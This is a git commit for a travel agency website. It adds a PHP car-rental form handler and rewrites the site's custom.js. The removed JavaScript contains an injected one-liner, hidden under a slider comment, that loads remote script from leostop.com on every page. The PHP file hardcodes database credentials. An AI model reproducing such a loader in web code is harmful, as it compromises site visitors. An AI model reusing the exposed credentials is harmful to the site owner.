0ab9e40e53701ef784146642496e4e7035939f23
Aalim aslam <aalimaslam@protonmail.com>
2024-09-16 17:00:47 +0530

    changed

---
+++ forms/car-rental.php
@@ -0,0 +1,78 @@
+<?php
+// Include PHPMailer
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+
+require './PHPMailer/Exception.php';
+require './PHPMailer/PHPMailer.php';
+require './PHPMailer/SMTP.php';
+
+// Check if the form is submitted
+if (isset($_POST['submit-modal'])) {
+    // Retrieve form data
+    $name = $_POST['name'];
+    $email = $_POST['email'];
+    $phone = $_POST['phone'];
+    $carToBook = $_POST['carToBook'];
+    $message = $_POST['message'];
+
+    // Database connection parameters
+    $dbHost = 'localhost';
+    $dbUser = 'u592619334_admin_user';
+    $dbPass = 'sAJNZFqv.JkseH6';
+    $dbName = 'u592619334_forms_submit';
+
+    // Create a database connection
+    $conn = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
+
+    if ($conn->connect_error) {
+        die("Connection failed: " . $conn->connect_error);
+    }
+
+    // Prepare and execute the SQL query to insert data into the database
+    $sql = "INSERT INTO car_rentals (name, email, phone, carToBook, message) VALUES (?, ?, ?, ?, ?)";
+    $stmt = $conn->prepare($sql);
+    $stmt->bind_param("sssss", $name, $email, $phone, $carToBook, $message);
+
+    if ($stmt->execute()) {
+        // Data has been inserted successfully
+        echo "Data has been saved to the database.";
+
+        // Send an email using PHPMailer
+        $mail = new PHPMailer(true);
+        try {
+            $mail->isSMTP();
+            $mail->Host = 'smtp.hostinger.com'; // Replace with your SMTP server
+            $mail->SMTPAuth = true;
+            $mail->Username = 'info@fortourandtravels.com'; // Replace with your email address
+            $mail->Password = ''; // Replace with your email password
+            $mail->SMTPSecure = 'ssl';
+            $mail->Port = 465;
+
+            $mail->setFrom('info@fortourandtravels.com', 'For Tour and Travels');
+            $mail->addAddress('for.tourtravels@gmail.com', "For Tour and Travels"); // Replace with recipient's email address
+
+            $mail->isHTML(true);
+            $mail->Subject = 'New Car Booking';
+            $mail->Body = "Name: $name<br>Email: $email<br>Phone: $phone<br>Car To Book: $carToBook<br>Message: $message";
+
+            $mail->send();
+            echo "Email has been sent.";
+            header("location: https://fortourandtravels.com?success");
+
+        } catch (Exception $e) {
+            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+            header("location: https://fortourandtravels.com?failed");
+
+        }
+    } else {
+        echo "Error: " . $stmt->error;
+        header("location: https://fortourandtravels.com?failed");
+    }
+
+    // Close the database connection
+    $stmt->close();
+    $conn->close();
+}
+?>
--- js/custom.js
+++ js/custom.js
@@ -1,371 +1,204 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
+(function () {
 
-$(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* JQuery Menu
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	'use strict'
 
-	$(document).ready(function () {
-		$('header nav').meanmenu();
-	});
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	/* sticky
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".sticky-wrapper-header").sticky({topSpacing:0});
-	});
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	/* NiceScroll
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".brand-box").niceScroll({
-		cursorcolor:"#9b9b9c",
-	});	
-	
-	/* NiceSelect
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-		$('select').niceSelect();
-	});	
-		
-	/* OwlCarousel - Blog Post slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('.carousel-slider-post');
-	  owl.owlCarousel({
-		items: 1,
-		loop: true,
-		margin: 10,
-		autoplay: true,
-		autoplayTimeout: 3000,
-		autoplayHoverPause: true
-	  });	  
-	});
-	
-	/* OwlCarousel - Banner Rotator Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('.banner-rotator-slider');
-	  owl.owlCarousel({
-		items: 1,
-		loop: true,
-		margin: 10,
-		nav: true,
-		dots: false,
-		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
-		autoplay: true,
-		autoplayTimeout: 3000,
-		autoplayHoverPause: true
-	  });	  
-	});
-	
-	/* OwlCarousel - Product Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-	
-	$(document).ready(function() {
-	  var owl = $('#product-in-slider');
-	  owl.owlCarousel({
-		loop: true,
-		nav: true,
-		margin: 10,
-		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
-		responsive: {
-		  0: {
-			items: 1
-		  },
-		  600: {
-			items: 2
-		  },
-		  960: {
-			items: 3
-		  },
-		  1200: {
-			items: 4
-		  }
-		}
-	  });
-	  owl.on('mousewheel', '.owl-stage', function(e) {
-		if (e.deltaY > 0) {
-		  owl.trigger('next.owl');
-		} else {
-		  owl.trigger('prev.owl');
-		}
-		e.preventDefault();
-	  });
-	});
-	
-	/* Scroll to Top
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(window).on('scroll', function (){
-        scroll = $(window).scrollTop();
-        if (scroll >= 100){
-          $("#back-to-top").addClass('b-show_scrollBut')
-        }else{
-          $("#back-to-top").removeClass('b-show_scrollBut')
-        }
-      });
-      $("#back-to-top").on("click", function(){
-        $('body,html').animate({
-          scrollTop: 0
-        }, 1000);
-    });
-	
-	/* Contact-form
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	$.validator.setDefaults( {
-		submitHandler: function () {
-			alert( "submitted!" );
-		}
-	} );
-	
-	$( document ).ready( function () {
-		$( "#contact-form" ).validate( {
-			rules: {
-				firstname: "required",
-				email: {
-					required: true,
-					email: true
-				},
-				lastname: "required",
-				message: "required",
-				agree: "required"
-			},
-			messages: {
-				firstname: "Please enter your firstname",
-				email: "Please enter a valid email address",
-				lastname: "Please enter your lastname",
-				username: {
-					required: "Please enter a username",
-					minlength: "Your username must consist of at least 2 characters"
-				},
-				message: "Please enter your Message",
-				agree: "Please accept our policy"
-			},
-			errorElement: "div",
-			errorPlacement: function ( error, element ) {
-				// Add the `help-block` class to the error element
-				error.addClass( "help-block" );
 
-				if ( element.prop( "type" ) === "checkbox" ) {
-					error.insertAfter( element.parent( "input" ) );
+	AOS.init({
+		duration: 800,
+		easing: 'slide',
+		once: true
+	});
+
+	var rellax = new Rellax('.rellax');
+
+	var preloader = function () {
+
+		var loader = document.querySelector('.loader');
+		var overlay = document.getElementById('overlayer');
+
+		function fadeOut(el) {
+			el.style.opacity = 1;
+			(function fade() {
+				if ((el.style.opacity -= .1) < 0) {
+					el.style.display = "none";
 				} else {
-					error.insertAfter( element );
+					requestAnimationFrame(fade);
 				}
-			},
-			highlight: function ( element, errorClass, validClass ) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
-			},
-			unhighlight: function (element, errorClass, validClass) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
-			}
-		} );
-	});
-	
-	/* heroslider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	var swiper = new Swiper('.heroslider', {
-		spaceBetween: 30,
-		centeredSlides: true,
-		slidesPerView: 'auto',
-		paginationClickable: true,
-		loop: true,
-		autoplay: {
-			delay: 2500,
-			disableOnInteraction: false,
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		},
-	});
-	
+			})();
+		};
 
-	/* Product Filters
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+		setTimeout(function () {
+			fadeOut(loader);
+			fadeOut(overlay);
+		}, 200);
+	};
+	preloader();
 
-	var swiper = new Swiper('.swiper-product-filters', {
-		slidesPerView: 3,
-		slidesPerColumn: 2,
-		spaceBetween: 30,
-		breakpoints: {
-			1024: {
-			  slidesPerView: 3,
-			  spaceBetween: 30,
-			},
-			768: {
-			  slidesPerView: 2,
-			  spaceBetween: 30,
-			  slidesPerColumn: 1,
-			},
-			640: {
-			  slidesPerView: 2,
-			  spaceBetween: 20,
-			  slidesPerColumn: 1,
-			},
-			480: {
-			  slidesPerView: 1,
-			  spaceBetween: 10,
-			  slidesPerColumn: 1,
-			}
-		  },
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
+
+	var tinyslier = function () {
+
+
+
+		var el = document.querySelectorAll('.wide-slider-testimonial');
+		if (el.length > 0) {
+			var slider = tns({
+				container: ".wide-slider-testimonial",
+				items: 1,
+				slideBy: 1,
+				axis: "horizontal",
+				swipeAngle: false,
+				speed: 700,
+				nav: true,
+				loop: true,
+				edgePadding: 40,
+				controls: true,
+				controlsPosition: "bottom",
+				autoHeight: true,
+				autoplay: true,
+				mouseDrag: true,
+				autoplayHoverPause: true,
+				autoplayTimeout: 3500,
+				autoplayButtonOutput: false,
+				controlsContainer: "#prevnext-testimonial",
+				responsive: {
+					350: {
+						items: 1
+					},
+
+					500: {
+						items: 2
+					},
+					600: {
+						items: 3
+					},
+					900: {
+						items: 5
+					}
+				},
+			});
 		}
-    });
 
-	/* Countdown
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('[data-countdown]').each(function () {
-        var $this = $(this),
-		finalDate = $(this).data('countdown');
-		$this.countdown(finalDate, function (event) {
-			var $this = $(this).html(event.strftime(''
-			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+
+		var destinationSlider = document.querySelectorAll('.destination-slider');
+
+		if (destinationSlider.length > 0) {
+			var desSlider = tns({
+				container: ".destination-slider",
+				mouseDrag: true,
+				items: 1,
+				axis: "horizontal",
+				swipeAngle: false,
+				speed: 700,
+				edgePadding: 50,
+				nav: true,
+				gutter: 30,
+				autoplay: true,
+				autoplayButtonOutput: false,
+				controlsContainer: "#destination-controls",
+				responsive: {
+					350: {
+						items: 1
+					},
+
+					500: {
+						items: 2
+					},
+					600: {
+						items: 3
+					},
+					900: {
+						items: 5
+					}
+				},
+			})
+		}
+
+
+
+	}
+	tinyslier();
+
+
+	var lightbox = function () {
+		var lightboxVideo = GLightbox({
+			selector: '.glightbox3'
 		});
-    });
-	
-	/* Deal Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('.deal-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous-deal',
-		nextArrow: '.next-deal',
-        speed: 500,
-        slidesToShow: 3,
-        slidesToScroll: 3,
-		infinite: false,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 3,
-                slidesToScroll: 2,
-                infinite: true,
-                dots: false
-            }
-        }, {
-            breakpoint: 768,
-            settings: {
-                slidesToShow: 2,
-                slidesToScroll: 2
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
-	
-	/* News Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('#news-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous',
-		nextArrow: '.next',
-        speed: 500,
-        slidesToShow: 1,
-        slidesToScroll: 1,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1,
-                infinite: true,
-                dots: false
-            }
-        }, {
-            breakpoint: 600,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
-	
-	/* Fancybox
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".fancybox").fancybox({
-		maxWidth: 1200,
-		maxHeight: 600,
-		width: '70%',
-		height: '70%',
-	});
-	
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
+	};
+	lightbox();
 
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
+let popupOneBtn = document.querySelector('#popup-1');
+
+setTimeout(() => {
+	popupOneBtn.click();
+}, 2000);
+})();
 
 
+
+let serviceContainer = document.querySelector('#services-container');
+
+let serviceData = [
+	{
+		image : "images/svg/01.svg",
+		title : "Transportation",
+		description : `Experience seamless journeys with our premium cab rental service. Affordable rates, Customer satisfication ,Book now! .`
+	},
+	{
+		image : "images/svg/02.svg",
+		title : "Package Tours",
+		description : `Packages offer convenience by bundling flights, accommodation, and sometimes activities for one price. Research options to find the best deal and connect wit us.`
+	},
+	{
+			image : "images/svg/03.svg",
+			title : "Best Flights",
+			description : `Experience seamless journeys with our premium flight booking service. Affordable
+										rates, and comfort that exceeds expectations. Book now!`
+	},
+	{
+		image : "images/svg/04.svg",
+		title : "Accommodation",
+		description : `Enjoy the comforts of home while you travel. Our accommodation services offer
+										quality rooms, great locations, and unbeatable prices.`
+	},
+	{
+		image : "images/svg/05.svg",
+		title : "Destination Weddings",
+		description : "We provide a full range of services for destination weddings. From planning and coordination to travel and accommodations, we have you covered."	
+	},
+	{
+image : "images/svg/06.svg",
+title : "Tour guides",
+description : "Tour guides are responsible for helping people to visit unfamiliar areas. They usually make special trips with groups of tourists in order to show them important places of cities."
+	},
+	{
+		image : "images/svg/07.svg",
+		title : "Business Meetings",
+		description : "We Provide Professional business meeting setup services. we handle every detail for your success and finalize upcoming project deadlines."
+	},
+	{
+		image : "images/svg/08.svg",
+		title : "Gala Dinner",
+		description : "A gala dinner is a formal, elegant event featuring fine dining, entertainment, speeches, and fundraising activities, often for charity."
+	},
+	{
+		image : "images/svg/09.svg",
+		title : "DJ's",
+		description : "We provide music mixes, energize crowds, and set the mood at events. They use turntables, mixers, to blend tracks.."
+	}
+]
+
+serviceData.forEach((service, index) => {
+	serviceContainer.innerHTML += `
+	<div class="col-12 col-md-6 col-lg-4 mb-4 mb-lg-0" data-aos="fade-up" data-aos-delay="${index * 100}">
+							<div class="service-1">
+								<span class="icon">
+									<img src="${service.image}" alt="${service.title}" class="img-fluid" loading="lazy">
+								</span>
+								<div>
+									<h3>${service.title}</h3>
+									<p>${service.description}</p>
+								</div>
+							</div>
+						</div>`
 });
+
